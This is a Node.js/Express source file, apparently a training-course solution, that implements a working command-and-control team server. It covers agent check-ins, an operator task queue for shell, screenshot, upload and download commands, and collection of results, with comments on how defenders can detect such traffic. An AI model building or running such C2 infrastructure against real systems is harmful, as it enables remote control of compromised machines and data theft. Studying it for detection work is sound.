/*
  Solution 01 — C2 Team Server (Node.js/Express)
  ------------------------------------------------
  This is the SERVER side — it manages agents, stores tasks, and
  collects results. Understanding this side is essential for both
  red-team (building) and blue-team (detecting, blocking, hunting).

  Blue-team value:
  - Shows what a C2 server API looks like → write signatures for these patterns
  - POST /beacon with host info → Zeek/Suricata rule for JSON beacons to unusual hosts
  - Regular interval polling → detect beacon timing (jitter analysis)
  - Result exfil via POST → detect large outbound POST bodies on short intervals

  Run:
    npm install express uuid
    node sol01_c2_server_routes.js
*/

const express    = require('express');
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');

const app  = express();
app.use(bodyParser.json());

// In-memory state
const agents  = {};   // agentId → { hostname, username, os, pid, lastSeen, taskQueue[] }
const results = {};   // taskId  → { agentId, output, timestamp }

// ── POST /beacon ──────────────────────────────────────────────────────────────
// Agent checks in, receives next queued task (or "wait").
// Body: { agentId, hostname, username, os, pid }
app.post('/beacon', (req, res) => {
    const { agentId, hostname, username, os, pid } = req.body;
    if (!agentId) return res.status(400).json({ error: 'agentId required' });

    if (!agents[agentId]) {
        agents[agentId] = { hostname, username, os, pid, lastSeen: Date.now(), taskQueue: [] };
        console.log(`[+] New agent: ${agentId} (${username}@${hostname})`);
    } else {
        // update heartbeat + metadata
        Object.assign(agents[agentId], { hostname, username, os, pid, lastSeen: Date.now() });
    }

    const agent = agents[agentId];
    // Return next task from FIFO queue, or "wait"
    const nextTask = agent.taskQueue.length > 0 ? agent.taskQueue.shift() : { task: 'wait' };
    res.json(nextTask);
});

// ── POST /result ──────────────────────────────────────────────────────────────
// Agent posts completed task output.
// Body: { agentId, taskId, output }
app.post('/result', (req, res) => {
    const { agentId, taskId, output } = req.body;
    if (!agentId || !taskId) return res.status(400).json({ error: 'agentId and taskId required' });

    results[taskId] = { agentId, output, timestamp: Date.now() };
    console.log(`[*] Result from ${agentId} for task ${taskId}: ${String(output).slice(0, 80)}`);
    res.json({ status: 'ok' });
});

// ── POST /task ────────────────────────────────────────────────────────────────
// Operator queues a task for a specific agent.
// Body: { agentId, task, args }
// task must be one of the VALID_TASK_TYPES
const VALID_TASK_TYPES = ['shell', 'screenshot', 'upload', 'download', 'exit'];

app.post('/task', (req, res) => {
    const { agentId, task, args } = req.body;
    if (!agentId || !task) return res.status(400).json({ error: 'agentId and task required' });
    if (!VALID_TASK_TYPES.includes(task)) {
        return res.status(400).json({ error: `Invalid task type. Valid: ${VALID_TASK_TYPES.join(', ')}` });
    }
    if (!agents[agentId]) return res.status(404).json({ error: 'Agent not found' });

    const taskId = uuidv4();
    agents[agentId].taskQueue.push({ task, args, taskId });
    console.log(`[*] Queued task ${taskId} (${task}) for agent ${agentId}`);
    res.json({ taskId });
});

// ── GET /agents ───────────────────────────────────────────────────────────────
// Operator lists all registered agents with last-seen time.
app.get('/agents', (req, res) => {
    const now = Date.now();
    const out = Object.entries(agents).map(([id, a]) => ({
        agentId:  id,
        hostname: a.hostname,
        username: a.username,
        os:       a.os,
        pid:      a.pid,
        lastSeenSec: Math.round((now - a.lastSeen) / 1000),
        pendingTasks: a.taskQueue.length,
    }));
    res.json(out);
});

// ── GET /results ──────────────────────────────────────────────────────────────
// Operator fetches results, optionally filtered by agentId.
app.get('/results', (req, res) => {
    const { agentId } = req.query;
    let out = Object.entries(results).map(([taskId, r]) => ({ taskId, ...r }));
    if (agentId) out = out.filter(r => r.agentId === agentId);
    res.json(out);
});

// ── Start server ──────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 8080;
app.listen(PORT, '127.0.0.1', () => {
    console.log(`[*] C2 server listening on 127.0.0.1:${PORT}`);
    console.log('[*] Routes: POST /beacon  POST /result  POST /task  GET /agents  GET /results');
});
